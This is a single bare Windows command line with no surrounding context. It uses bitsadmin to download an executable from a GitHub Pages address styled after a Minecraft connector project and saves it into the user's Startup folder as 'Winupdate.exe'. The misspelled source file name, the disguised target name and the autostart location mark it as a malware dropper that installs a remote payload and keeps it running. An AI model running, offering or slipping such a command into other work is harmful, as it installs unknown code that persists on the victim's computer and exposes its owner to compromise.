...
bitsadmin /transfer Packages /download /priority foreground https://geyser-mc.github.io/minecraft-connector/gesyer3.exe "C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
